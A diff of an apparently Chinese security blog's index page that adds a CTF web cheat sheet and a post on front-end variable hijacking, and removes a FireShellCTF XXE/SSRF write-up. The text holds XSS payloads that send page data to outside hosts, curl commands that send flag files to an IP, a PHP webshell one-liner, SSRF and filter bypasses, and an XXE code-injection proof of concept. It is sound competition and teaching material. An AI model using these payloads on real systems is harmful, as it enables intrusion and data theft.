@@ -90,6 +90,168 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2025/01/01/CTF比赛常用-持续更新/"> 
+                    置顶-持续更新中的CTF备忘录 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2025-01-01   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="CTF比赛常用-持续更新"><a href="#CTF比赛常用-持续更新" class="headerlink" title="CTF比赛常用-持续更新"></a>CTF比赛常用-持续更新</h1><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><ul>
+<li>在反序列化的时候，不会执行__construct里的值</li>
+<li>原类中无法控制的private/protected变量，可以自己用构造方法序列化进去</li>
+<li>找到反序列化的入口很关键</li>
+</ul>
+<h2 id="常见魔法函数"><a href="#常见魔法函数" class="headerlink" title="常见魔法函数"></a>常见魔法函数</h2><p><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="常识-1"><a href="#常识-1" class="headerlink" title="常识"></a>常识</h2><h3 id="dom结构"><a href="#dom结构" class="headerlink" title="dom结构"></a>dom结构</h3><p>取url中”#”后面的字符串</p>
+<pre><code>document.location.hash.substr(1)</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>&amp;#106=&amp;#0000106</p>
+<p>有没有’;’都一样，都是html编码。106是ascii编码值，默认编码格式占7位</p>
+<h2 id="各种协议"><a href="#各种协议" class="headerlink" title="各种协议"></a>各种协议</h2><h3 id="data"><a href="#data" class="headerlink" title="data"></a>data</h3><p>data:text/html</p>
+<p>适用于src属性后面，能解析js语句的函数(例如eval,setTimeout)</p>
+<pre><code>data:text/html;base64,xxxx</code></pre><p>注意点：<br>1、xxx即恶意payload的base64编码，用console的btoa来编码payload，不要用其它的base64编码</p>
+<p>2、还有一种冷门的用法，执行点在charset，前提是需要定义window.text、window.html、window.base64</p>
+<pre><code>eval(&#39;data:text/html;charset=alert(1);base64,whatever&#39;)</code></pre><p>这个用法的例子见:<a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p>
+<h2 id="打页面源码"><a href="#打页面源码" class="headerlink" title="打页面源码"></a>打页面源码</h2><pre><code>&lt;svg/onload=&quot;document.location=&#39;http://ugelgr.ceye.io/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</code></pre><h2 id="JS发送xml请求"><a href="#JS发送xml请求" class="headerlink" title="JS发送xml请求"></a>JS发送xml请求</h2><pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+        document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);
+    }
+}
+xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>name传入表达式-&gt;dump加载一个dom  <script></p>
+<p>可以看总结：<a href="https://xz.aliyun.com/t/5084">https://xz.aliyun.com/t/5084</a></p>
+<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>当一个同源站点，同时存在两个页面，其中<strong>一个有CSP保护的A页面</strong>，<strong>另一个没有CSP保护B页面</strong>。</p>
+<p>那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效<br><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1dd8b6jsku4c129k14vflmutk5p.png-59.6kB"></p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>各种绕过姿势在笔记里有</p>
+<h2 id="过滤指定字符串"><a href="#过滤指定字符串" class="headerlink" title="过滤指定字符串"></a>过滤指定字符串</h2><p>用unicode编码绕过localhost的限定</p>
+<pre><code>LocalHost = localhost = ⓛocaⓛhost </code></pre><p><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1ddi759agea21r3r1587uju11ch1r.png-21.1kB"></p>
+<h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><p>数字地址(十进制)：127.0.0.1->2130706433<br>十六进制：127.0.0.1->0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1->0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1->127.1</p>
+<p>在吐司学的一招：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过：</p>
+<pre><code>http://[::ffff:127.0.0.1]/
+也可以缩写成 http://[::1]/</code></pre><h2 id="check内网ip段绕过"><a href="#check内网ip段绕过" class="headerlink" title="check内网ip段绕过"></a>check内网ip段绕过</h2><p>php过滤代码如下</p>
+<pre><code>    $hostname=$url_parse[&#39;host&#39;]; 
+    $ip=gethostbyname($hostname); 
+    $int_ip=ip2long($ip);
+    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; </code></pre><p>用ip2long和parse_url来check请求是否包含内网ip段，则可以用以下方法绕过</p>
+<pre><code>1. http://0.0.0.0/flag.php
+
+2. http://foo@127.0.0.1:80@baidu.com/flag.php
+
+3. http://%5B::%5D:22/</code></pre><p>第一种是0.0.0.0掩码绕过<br>第二种白名单是baidu.com，黑名单是127x网段<br>第三种是绕过主机名探测，用[::]替代127.0.0.1</p>
+<h2 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h2><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
+<h2 id="file协议妙用"><a href="#file协议妙用" class="headerlink" title="file协议妙用"></a>file协议妙用</h2><p>我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p>
+<p><img src="http://static.zybuluo.com/1160307775/osyc4y4bkxtkyuy286wrpuh0/image_1ddqj7884117n43j19vu1rgn347p.png" alt="image_1ddqj7884117n43j19vu1rgn347p.png-54.3kB"></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p>
+<h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="利用报错和外带ood来读取本地文件"><a href="#利用报错和外带ood来读取本地文件" class="headerlink" title="利用报错和外带ood来读取本地文件"></a>利用报错和外带ood来读取本地文件</h2><p><img src="http://static.zybuluo.com/1160307775/o09e0gt16woeslut7mcjthgm/image_1def8qqag1frb1pfu1ghq1lkvbhf9.png" alt="image_1def8qqag1frb1pfu1ghq1lkvbhf9.png-81.8kB"></p>
+<h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503">https://xz.aliyun.com/t/5503</a></p>
+<p><a href="https://www.jishuwen.com/d/2EGU">https://www.jishuwen.com/d/2EGU</a></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><pre><code>1、改content-type?
+2、是否存在解析漏洞 .php.xxx
+3、是否可以上传其它能解析的后缀？
+4、存在二次渲染漏洞？imagecreatfrompng
+5、apache2.4是否存在0a换行绕过？
+6、htaccess是否可以上传？</code></pre><h2 id="妙用-htaccess"><a href="#妙用-htaccess" class="headerlink" title="妙用.htaccess"></a>妙用.htaccess</h2><p>apache中的.htaccess</p>
+<p>将同目录下的jpg解析为php,文件内容如下</p>
+<pre><code>AddType application/x-httpd-php .jpg</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><ul>
+<li><p>php://input<br><img src="http://static.zybuluo.com/1160307775/bm2tqiqmypmrpzaszatv1w0t/image_1d83kt9ffd621pod1p0o62e125m.png" alt="image_1d83kt9ffd621pod1p0o62e125m.png-121kB"></p>
+</li>
+<li><p>php://filter</p>
+<pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre></li>
+<li><p>phar://<br><img src="http://static.zybuluo.com/1160307775/7xr0kz01z7zheao17t65uhdq/image_1d83liset16qc1k5e1bva4j3a7f1t.png" alt="image_1d83liset16qc1k5e1bva4j3a7f1t.png-107.3kB"></p>
+</li>
+</ul>
+<h1 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h1><h2 id="常识-2"><a href="#常识-2" class="headerlink" title="常识"></a>常识</h2><p>获取flag文件并用Curl协议外带到自己的vps</p>
+<pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-分号-复杂变量"><a href="#双引号-分号-复杂变量" class="headerlink" title="双引号&分号--复杂变量"></a>双引号&分号--复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785">https://xz.aliyun.com/t/4785</a></p>
+<pre><code>${system(whoami)}</code></pre><p><img src="http://static.zybuluo.com/1160307775/ze8sakz6ijx1zx262kicbqnj/image_1dcp3bus82rs1ugp15ij1l75121e9.png" alt="image_1dcp3bus82rs1ugp15ij1l75121e9.png-79.6kB"></p>
+<h1 id="常见的过滤bypass"><a href="#常见的过滤bypass" class="headerlink" title="常见的过滤bypass"></a>常见的过滤bypass</h1><h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><p>绕过<code>&lt;?</code>限制的一句话和php标签限制</p>
+<pre><code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</code></pre><p>动态执行函数</p>
+<pre><code>1、没有过滤括号
+$_GET[1]($_GET[0]);
+
+2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来
+$_GET{1}($_GET{0});</code></pre></script></p>
+                
+            </div>
+            <div class="continue">
+            <a href="/2025/01/01/CTF比赛常用-持续更新/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/07/02/前端全局变量劫持/"> 
+                    前端全局变量劫持 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-07-02   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="前端全局变量劫持"><a href="#前端全局变量劫持" class="headerlink" title="前端全局变量劫持"></a>前端全局变量劫持</h1><p>最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，原文地址：<a href="http://blog.wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞" target="_blank" rel="noopener">前端中存在的变量劫持漏洞</a></p>
+<p>先说一下鸡肋的点，这个变量的劫持也只能是把变量劫持为正常页面的window对象，并不能随意修改变量的值</p>
+<h1 id="子页面获取"><a href="#子页面获取" class="headerlink" title="子页面获取"></a>子页面获取</h1><p>首先kun师傅介绍了三种父页面获取子页面windows对象的方式:</p>
+<pre><code>document.getElementById(&quot;iframe1&quot;).contentWindow;
+window.frames[0]; 
+window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id值”就代表iframe标签。也可以通过直接调用iframe内的name属性值获取该iframe的window对象<br><img src="http://static.zybuluo.com/1160307775/8n1kln6kltgkylriy0rutpd9/image_1df3psct91n0slcp85prp177u9.png" alt="image_1df3psct91n0slcp85prp177u9.png-60.3kB"></p>
+<h1 id="利用filter模式删除变量"><a href="#利用filter模式删除变量" class="headerlink" title="利用filter模式删除变量"></a>利用filter模式删除变量</h1><p>无论是javascript还是调用标签，都无法覆盖已经定义的变量，但是却可以定义新的变量。</p>
+<p>怎么让页面中出现未定义的全局变量呢？kun师傅提到chrome74之后，默认的xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。也就是说我们用一段xss代码触发chrome xss auditor删除xss引用的变量，从而达到替我们删除正常变量的目的。</p>
+<p>这里简单介绍一下xss auditor</p>
+<h2 id="XSS-Auditor"><a href="#XSS-Auditor" class="headerlink" title="XSS-Auditor"></a>XSS-Auditor</h2><p>XSS-Auditor是chrome默认开启的，也可以选择在header中关闭Auditor</p>
+<pre><code>X-XSS-Protection: 0</code></pre><p>它的检测机制如文档中的描述<br><img src="http://static.zybuluo.com/1160307775/78neclm89yli79mwd4htps6z/image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png" alt="image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png-126.6kB"></p>
+<p>XSS Auditor采用黑名单方法来识别请求参数中提供的危险字符和标签。它还将查询参数与内容进行匹配以识别注入点。如果查询参数无法与响应中的内容匹配，则不会触发Auditor。</p>
+<p>不过文档也有提到，基于上下文的检测的局限性使Auditor无法预防一些针对应用层的payload，这里不做深究。</p>
+<h2 id="删除变量demo"><a href="#删除变量demo" class="headerlink" title="删除变量demo"></a>删除变量demo</h2><pre><code>&lt;script&gt;var hpdoger = &quot;remove me&quot;;&lt;/script&gt;</code></pre><p>当访问的参数以危险标签的形式出现在response中时，就会触发xss-auditor，成功删除自定义的hpdoger变量。下图可以看到变量被成功删除</p>
+<pre><code>http://localhost/iframe.html?xss=%3Cscript%3E%0A%20%20%20%20%20var%20hpdoger%20=%20%22remove%22;%0A%3C/script%3E</code></pre><p><img src="http://static.zybuluo.com/1160307775/c70k199x2qygcxi7z7nmf9fg/image_1df3uoatdojsl0fksa1e3b1nb21t.png" alt="image_1df3uoatdojsl0fksa1e3b1nb21t.png-112.7kB"></p>
+<h1 id="bypass同源之iframe"><a href="#bypass同源之iframe" class="headerlink" title="bypass同源之iframe"></a>bypass同源之iframe</h1><p>众所周知，用iframe去加载子页面会被同源限制(除非是cors配置的白名单)<br><img src="http://static.zybuluo.com/1160307775/98cjog73vc1fxs6fuei5nypt/image_1df3vq1ivipk1qo3a383ao1lnd2n.png" alt="image_1df3vq1ivipk1qo3a383ao1lnd2n.png-93.8kB"></p>
+<p><strong>如果儿子页面也存在iframe</strong>(划重点)，先通过操纵孙子c页面window对象来设置location，使其指向父页面a，这样父页面a和子页面b就同源了。之后再修改孙子页面c中window对象的name，其作用结果是：name作用域在子页面b的全局变量。</p>
+<h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>这里不重复造轮子了，引用kun师傅的文章：<a href="https://xz.aliyun.com/t/5565#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5565#toc-4</a></p>
+<h2 id="孙子页面c"><a href="#孙子页面c" class="headerlink" title="孙子页面c"></a>孙子页面c</h2><p>任意的页面</p>
+<h2 id="子页面b"><a href="#子页面b" class="headerlink" title="子页面b"></a>子页面b</h2><p><img src="http://static.zybuluo.com/1160307775/mz1lfmzmxftl49tvbpeh5lxn/image_1df5h2g811eg76b3bdo1v0b18dqm.png" alt="image_1df5h2g811eg76b3bdo1v0b18dqm.png-53.8kB"></p>
+<h2 id="父页面a"><a href="#父页面a" class="headerlink" title="父页面a"></a>父页面a</h2><p>第一步很关键的一点就是修改c页面的location指向a。之后a页面就可以调用b的变量，同时通过iframe触发b页面的xss auditor<br><img src="http://static.zybuluo.com/1160307775/86zy0vdrthffjgmulc9qqu9c/image_1df5grfcl16f71ejc1j5upqr10re9.png" alt="image_1df5grfcl16f71ejc1j5upqr10re9.png-127.5kB"></p>
+<p>第二步修改孙子页面c的name，从而帮b页面注册一个全局变量名为”hpdoger”<br><img src="http://static.zybuluo.com/1160307775/4qeb5di2v560f26o9jdr9804/image_1df5h8abti9j1bptl671to1e3213.png" alt="image_1df5h8abti9j1bptl671to1e3213.png-72.1kB"></p>
+<p>这样就成功替换掉b页面的hpdoger变量，同时a页面也可以访问b页面这个全局变量hpdoger(但是不能访问b的其他变量。因为我们通过c页面做跳板，只能访问c的属性间接访问到b的变量，我叫他”同名法则”)。不过前文也提到了这个鸡肋的地方，就是一个变量替换成window对象，受用面很有限。。</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/07/02/前端全局变量劫持/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/"> 
                     2019国赛Web线上题目Lovemath多解WP 
                 </a>
@@ -940,360 +1102,6 @@ function make_var($val)
             </div>
             <div class="continue">
             <a href="/2019/02/02/Echsop2.7.x几处漏洞分析/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/"> 
-                    FireShellCTF2019 Bad Injections解题记录 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-01-30   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p>
-<p>题目名称：Bad Injections</p>
-<p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p>
-<p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p>
-<p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p>
-<p>给个本地web目录</p>
-<p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p>
-<p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p>
-<pre><code>68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</code></pre><p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p>
-<p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p>
-<p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p>
-<p>down一下download的源码，顺便fuzz一下Controllers的文件</p>
-<pre><code>68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</code></pre><p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p>
-<p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p>
-<p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p>
-<pre><code>68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</code></pre><p>/app/index.php</p>
-<pre><code>&lt;?php
-ini_set(&#39;display_errors&#39;,1);
-ini_set(&#39;display_startup_erros&#39;,1);
-error_reporting(E_ALL);
-require_once(&#39;Routes.php&#39;);
-
-function __autoload($class_name){
-  if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){
-    require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;;
-  }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){
-    require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;;
-  }
-
-}</code></pre><p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p>
-<pre><code>&lt;?php
-
-Route::set(&#39;index.php&#39;,function(){
-  Index::createView(&#39;Index&#39;);
-});
-
-Route::set(&#39;index&#39;,function(){
-  Index::createView(&#39;Index&#39;);
-});
-
-Route::set(&#39;about-us&#39;,function(){
-  AboutUs::createView(&#39;AboutUs&#39;);
-});
-
-Route::set(&#39;contact-us&#39;,function(){
-  ContactUs::createView(&#39;ContactUs&#39;);
-});
-
-Route::set(&#39;list&#39;,function(){
-  ContactUs::createView(&#39;Lista&#39;);
-});
-
-Route::set(&#39;verify&#39;,function(){   
-  if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){
-    Verify::createView(&#39;Verify&#39;);
-  }else{
-    Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]);  //设置session，file和hash对应请求文件
-  }
-});
-
-
-Route::set(&#39;download&#39;,function(){
-  if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){
-    echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
-  }else{
-    echo &#39;jdas&#39;;
-  }
-});
-
-Route::set(&#39;verify/download&#39;,function(){
-  Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
-});
-
-
-Route::set(&#39;custom&#39;,function(){
-  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
-  $data = stream_get_contents($handler); // xml
-  if(strlen($data) &gt; 1){
-    Custom::Test($data);
-  }else{
-    Custom::createView(&#39;Custom&#39;);
-  }
-});
-
-Route::set(&#39;admin&#39;,function(){
-  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
-    Admin::createView(&#39;Admin&#39;);
-  }else{
-    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
-      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
-    }else{
-     echo &quot;;(&quot;;
-    }
-  }
-});
-
-Route::set(&#39;custom/sort&#39;,function(){
-  Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
-});
-Route::set(&#39;index&#39;,function(){
- Index::createView(&#39;Index&#39;);
-});</code></pre><p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p>
-<pre><code>Route::set(&#39;admin&#39;,function(){
-  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
-    Admin::createView(&#39;Admin&#39;);
-  }else{
-    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
-      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
-    }else{
-     echo &quot;;(&quot;;
-    }
-  }
-});</code></pre><p>找一下其他利用，再看Custom</p>
-<pre><code>Route::set(&#39;custom&#39;,function(){
-  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
-  $data = stream_get_contents($handler); 
-  if(strlen($data) &gt; 1){
-    Custom::Test($data);
-  }else{
-    Custom::createView(&#39;Custom&#39;);
-  }
-});</code></pre><p>Custom::Test</p>
-<pre><code>class Custom extends Controller{
-  public static function Test($string){
-      $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);
-      $test = $root-&gt;name;
-      echo $test;
-  }
-}</code></pre><p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p>
-<p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p>
-<p>poc:</p>
-<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
-&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;
-&lt;note&gt;
-&lt;name&gt;&amp;file;&lt;/name&gt;
-&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p>
-<p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p>
-<p><code>http://vps/xxe.txt</code></p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;root&gt;
-&lt;channel&gt;
-&lt;item&gt;
-&lt;link&gt;@hpdoger.me&lt;/link&gt;
-&lt;/item&gt;
-&lt;item&gt;
-&lt;link&gt;@souhu.com&lt;/link&gt;
-&lt;/item&gt;
-&lt;/channel&gt;
-&lt;/root&gt;</code></pre><p><code>POC</code></p>
-<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
-&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;
-&lt;note&gt;
-&lt;name&gt;&amp;file;&lt;/name&gt;
-&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/01/26/安恒杯月赛19新年场WriteUp/"> 
-                    安恒杯月赛19新年场WriteUp 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-01-26   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p>
-<pre><code>&lt;?php  
-@error_reporting(1); 
